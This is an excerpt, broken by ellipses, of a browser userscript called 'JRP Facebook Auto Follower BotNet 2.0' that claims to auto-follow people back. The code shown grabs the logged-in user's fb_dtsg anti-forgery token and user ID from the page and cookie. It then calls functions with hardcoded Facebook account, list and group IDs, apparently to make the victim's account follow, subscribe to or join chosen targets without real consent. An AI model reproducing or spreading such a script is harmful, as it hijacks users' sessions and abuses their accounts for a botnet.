// ==UserScript==
// @name        JRP Facebook Auto Follower BotNet 2.0 
// @icon        http://i.imgur.com/5ShnMqG.png
// @description Automatically followers back people listed on your home page.
// @version     1
// @run-at      document end
// @grant       none
//
...
a("100001579094400");
sublist("538259496236682");
sublist("538695806193051");
sublist("538696642859634");
sublist("538696216193010");
var gid=["297278020412271"];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "417592314952276";
var spost_id = "417592314952276";
var sfoto_id = "417592314952276";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
